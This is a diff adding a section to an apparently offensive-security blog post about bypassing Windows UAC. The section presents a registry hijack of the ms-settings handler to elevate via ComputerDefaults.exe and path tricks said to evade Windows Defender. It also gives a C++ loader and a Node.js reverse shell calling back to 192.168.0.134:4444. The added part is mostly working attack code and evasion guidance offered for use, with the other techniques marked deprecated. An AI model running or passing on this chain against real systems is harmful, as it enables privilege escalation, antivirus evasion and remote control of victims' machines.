@@ -19,8 +19,90 @@ My goal is always to find code that executes across all Windows versions **AND**
 
 Unrelated, but I also added an updated [Discord](https://discord.gg/bqDkEdDrQQ) link on the left panel of my site, in case anyone wants to hop in and say hi.  I've met quite a few of you on Twitter over the years and I've thoroughly enjoyed the conversations that have unfolded since I first joined twitter not that long ago.  Okay, let's dive in to the first UAC bypass method.  
 
+> Update: 3/20/2025: I think someone at Microsoft secretly reads this blog... 😆 I say that because all the methods I posted in fall of last year are now deprecated.  The irony is that I was able to resurrect an old UAC Bypass method that still works if you tweak it a bit!  See below for more info:
+
+***UAC Bypass - Revisiting an old technique! (Detection Status: Undetected)***
+-
+
+We're going to be revisiting a tried and true UAC Bypass method that still works just fine as of writing this post, 3/20/2025.  (Microsoft if you're reading this I'm on to you!)  I thought to myself,"Windows Defender can't be blocking all these classic UAC bypass methods."  Sure enough, their filters aren't that impressive.  We're going to be working with the `ComputerDefaults.exe` executable in the `C:\Windows\System32` directory.  Here's how it works:
+
+```powershell
+New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "[yourexecutable or command]" -Force
+Start-Process "C:\Windows\System32\ComputerDefaults.exe"
+```
+
+This parameter is what Windows Defender scrutinizes the most: `-Value "[yourexecutable or command]"`
+
+If you do: `-Value "notepad"`, Defender is super chill and loves you.  
+
+If you do: `-Value "cmd"`...
+
+![image](https://github.com/user-attachments/assets/708e3c65-cbe9-48dd-bd80-f032d4cb840d)
+
+How about: `-Value "C:\Users\Public\something.exe"`...
+
+![image](https://i.ytimg.com/vi/3CqCq5RtrJo/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLAqFuuJ8vitOjfCsrPgPFKUxxhiYQ)
+
+So...What if we do.... `-Value "../../myfolder/barney.exe"`
+
+![image](https://github.com/user-attachments/assets/a10b248b-f5af-424b-a042-f8ba2439201a)
+
+![image](https://media0.giphy.com/media/5y8sRBYSWWb16/giphy.gif?cid=6c09b9522xxdays2x4v6zjs6o5y3oejjfsd40rac1du7g9j4&ep=v1_gifs_search&rid=giphy.gif&ct=g)
+
+It's as simple as that my friends.  Don't include Drive letters, Don't include popular payload locations like `c:\users\public` and `c:\temp`.  Just go with the old school ..\..\ routine and avoid all that altogether and convince Defender that you are in the right.  Right?! 😸
+
+All that's left now is to issue the final statement: `Start-Process "C:\Windows\System32\ComputerDefaults.exe"` and we're off to the races!  Your .exe file you placed in the `Value` parameter will be executed without Defender yelling at you.
+
+I should probably also show you what I did as far as my payload goes.  I kept it really simple.  `barney.exe` is just this simple C++ loader:
+
+```cpp
+
+#include <windows.h>
+
+int main()
+{
+    WinExec("c:\\users\\public\\n0de.exe c:\\users\\public\\elevationstation.js", 0);
+}
+```
+
+Compile that and move it to the folder you designated in your powershell `Value` field/parameter.
+
+Next up, I'll explain the Node stuff.  `N0de.exe` is literally the Node.JS binary I downloaded as a portable from the Node.js site.  I always use node for pentest engagements as it's a friendly living off the land binary and seems to remain undetected.  Node then opens this .js file, which is my reverse shell:
+
+```javascript
+(function(){
+var net = require("net"),
+cp = require("child_process"),
+sh = cp.spawn("cmd.exe", []);
+var client = new net.Socket();
+client.connect(4444, "192.168.0.134", function(){
+client.pipe(sh.stdin);
+sh.stdout.pipe(client);
+sh.stderr.pipe(client);
+});
+return /a/;
+})();
+```
+
+Bring it all together and you get the following:
+
+![image](https://github.com/user-attachments/assets/c2fa9794-a33a-4b6b-a9c0-b6a7f0b5c7ca)
+
+![image](https://github.com/user-attachments/assets/872b4dcf-94f2-439c-a30c-8df6c75b2101)
+
+And there you have it.  An age old UAC Bypass technique that still works, still bypasses UAC and STILL EVADES DEFENDER!  The irony is it's easier than all the other methods I posted last year.
+Think smarter not harded I guess.  Okay, I feel better about this blog post now.  I couldn't stand sitting idly by while folks found this page and were likely immediately disappointed because none of the techniques I shared were still relevent.  Now there's at least one 😙  Until next time!
+
+<hr>
+
+> Everything below this line is deprecated as far as anything > Windows 11 22h2.  I'd assume OSes < Windows 11 22H2 are still game 😸
+<hr>
 ***UAC Bypass Technique #1 - DLL Sideloading<br>(UAC setting - ALWAYS ON)***
 -
+
+> ***This is now deprected as of sometime in early 2025 ***
 
 This one isn't too challenging to pull off, though it proved difficult locating a consistent DLL in use across all Windows 11 versions (home/pro/education/enterprise). I'm talking about the ever famous scheduled task, `SilentCleanup`, which of course runs: `cleanmgr.exe / dismhost.exe`. This scheduled task has been abused time and time again over the years, and somehow it still prevails as a tried and true vector for UAC bypass / privilege escalation to this day.
 ![image](https://github.com/user-attachments/assets/59d2143f-492c-4454-a041-c450dcac815a)
